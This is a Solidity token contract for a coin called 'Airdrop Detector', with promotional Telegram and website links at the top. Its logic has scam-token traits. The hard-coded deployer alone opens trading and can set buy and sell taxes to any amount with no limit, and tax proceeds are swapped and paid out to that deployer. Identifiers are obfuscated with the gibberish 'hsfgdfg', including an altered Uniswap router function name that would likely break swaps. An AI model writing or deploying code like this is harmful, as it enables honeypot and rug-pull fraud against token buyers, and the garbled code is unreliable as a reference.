/*
🖇 SOCIALS:

Telegram: https://t.me/DetectorEntry
Website: https://detectorerc.com/
Twitter: https://twitter.com/Detectorerc
Bot: https://t.me/airdropdetector_bot
*/

// SPDX-License-Identifier: unlicense


pragma solidity 0.8.21;
    
interface IUniswapV2Router02 {
     function swapExactTokensForETHSupportinghsfgdfgOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
    
    contract DETECTOR {
        
        constructor() {
            balanceOf[msg.sender] = totalSupply;
            allowance[address(this)][routerAddress] = type(uint256).max;
            emit Transfer(address(0), msg.sender, totalSupply);
        }

        string public   _name = unicode"Airdrop Detector"; 
        string public   _symbol = unicode"DETECTOR";  
        uint8 public constant decimals = 18;
        uint256 public constant totalSupply = 1000000 * 10**decimals;

        uint256 buyhsfgdfg = 0;
        uint256 sellhsfgdfg = 0;
        uint256 constant swapAmount = totalSupply / 100;
        
        error Permissions();

        function name() public view virtual returns (string memory) {
        return _name;
        }

    
        function symbol() public view virtual returns (string memory) {
        return _symbol;
        }    

        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed DETECTOR_Deployer,
            address indexed spender,
            uint256 value
        );

        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;

       
        
        

        address private pair;
        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
        address payable constant DETECTOR_Deployer = payable(address(0xCf94d00645Cb472dAF95090545Ba13F309c24602));

        bool private swapping;
        bool private tradingOpen;

        

        receive() external payable {}

        function approve(address spender, uint256 amount) external returns (bool){
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transfer(address to, uint256 amount) external returns (bool){
            return _transfer(msg.sender, to, amount);
        }

        function transferFrom(address from, address to, uint256 amount) external returns (bool){
            allowance[from][msg.sender] -= amount;        
            return _transfer(from, to, amount);
        }

        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            require(tradingOpen || from == DETECTOR_Deployer || to == DETECTOR_Deployer);

            if(!tradingOpen && pair == address(0) && amount > 0)
                pair = to;

            balanceOf[from] -= amount;

            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
                swapping = true;
                address[] memory path = new  address[](2);
                path[0] = address(this);
                path[1] = ETH;
                _uniswapV2Router.swapExactTokensForETHSupportinghsfgdfgOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
                DETECTOR_Deployer.transfer(address(this).balance);
                swapping = false;
            }

            if(from != address(this)){
                uint256 hsfgdfgAmount = amount * (from == pair ? buyhsfgdfg : sellhsfgdfg) / 100;
                amount -= hsfgdfgAmount;
                balanceOf[address(this)] += hsfgdfgAmount;
            }
            balanceOf[to] += amount;
            emit Transfer(from, to, amount);
            return true;
        }

        function TradingOpen() external {
            require(msg.sender == DETECTOR_Deployer);
            require(!tradingOpen);
            tradingOpen = true;        
        }

        function _TaxDown(uint256 _buy, uint256 _sell) private {
            buyhsfgdfg = _buy;
            sellhsfgdfg = _sell;
        }

        function TaxDown(uint256 _buy, uint256 _sell) external {
            if(msg.sender != DETECTOR_Deployer)        
                revert Permissions();
            _TaxDown(_buy, _sell);
        }
    }